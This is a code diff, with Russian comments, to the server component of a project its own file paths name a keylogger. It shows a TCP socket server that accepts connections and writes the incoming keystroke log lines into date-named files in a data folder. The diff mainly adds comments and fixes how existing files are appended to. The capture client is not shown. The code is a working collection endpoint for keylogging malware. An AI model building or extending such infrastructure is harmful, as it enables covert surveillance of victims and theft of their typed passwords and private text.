@@ -10,8 +10,8 @@ class Server:
         self._host: str = host
         self._port: int = port
 
-        self._base_path: str = os.path.dirname(__file__)
-        self._data_path: str = os.path.join(self._base_path, "data")
+        self._base_path: str = os.path.dirname(__file__)  # путь до базовой директории (server)
+        self._data_path: str = os.path.join(self._base_path, "data")  # путь до поддиректории с данным (data)
 
         # настройки логгера
         path_to_log: str = "D:\\Coding\\PYTHON\\big_projects\\keylogger\\server\\server_logs.log"
@@ -22,11 +22,11 @@ class Server:
         self.server: sock.socket = sock.socket(sock.AF_INET, sock.SOCK_STREAM, proto=0)
 
         try:
-            self.server.bind((self._host, self._port))
-            self.server.listen()
+            self.server.bind((self._host, self._port))  # привязка серверного сокета к определенному адресу
+            self.server.listen()  # прослушивание входящих подключений 
 
             while 1:
-                self.conn, addr = self.server.accept()
+                self.conn, addr = self.server.accept()  # принятие клиентского сокета
                 logging.info(f"[+] new connection with {addr}")
                 
                 with self.conn:
@@ -36,14 +36,18 @@ class Server:
                             
                             if not data: 
                                 break
+                            
+                            # разделение данных на список строк
                             data: List[str] = data.split("\n")
-                            self.__save_data(data)  # сохранение данных в 
+                            
+                            # сохранение данных по файлам в поддиректорию data
+                            self.__save_data(data) 
                         except Exception as err:
                             logging.warning(f"[!!] {addr} failed: {err}")
         except sock.error as err:
             logging.critical(f"run() server socket error: {err}")
         finally: 
-            self.server.close()
+            self.server.close() 
 
 
     def __get_data(self) -> str: 
@@ -61,28 +65,31 @@ class Server:
 
 
     def __save_data(self, lines: List[str]) -> None: 
+        # создание поддиректории data, если ее нету в директории keylogger
         if not os.path.exists(self._data_path):
             os.makedirs(self._data_path)
 
-        print(lines)
+        # проходимся по каждой строке списке строк с сохраненным логами  
         for line in lines:
-            files: List[str] = os.listdir(self._data_path)
-            filepath = os.path.join(self._data_path, line[1:11]+".txt")
-            print(files)
-            print(filepath)
-            try:
-                mode: str = 'a' if filepath in files else 'w'
-                
-                with open(filepath, mode, encoding='utf-8') as file:
-                    file.write(line)
-            except FileNotFoundError as err:
-                logging.warning(f"__save_data() file not found error: {err}")
-            except Exception as err:
-                logging.warning(f"__save_data() writing failed: {err}")
-            else:
-                logging.info(f"__save_data() completed!")
-                print("[+] data pack was saved!\n")
+            if len(line) > 0:
+                filenames: List[str] = os.listdir(self._data_path)  # все файлы в подкаталоге data
+                filename: str = line[1:11]+".txt"  # название файла для сохранения данных
+                filepath = os.path.join(self._data_path, filename)  # путь до файла для сохранения данных
 
+                try:
+                    # если файла нету в папке data, то создаем со строкой, иначе просто добавляем строку
+                    mode: str = "w" if filename not in filenames else "a"  
+
+                    with open(filepath, mode, encoding='utf-8') as file:
+                        file.write(line+"\n")
+                except FileNotFoundError as err:
+                    logging.warning(f"[!] __save_data() file not found: {err}")
+                except Exception as err:
+                    logging.warning(f'[!] __save_data(): {err}')
+                else:
+                    logging.info(f"[+] __save_data() completed!")
+                    print("[+] data pack was saved!\n")
+            
 
 def main() -> None:
     server: Server = Server()
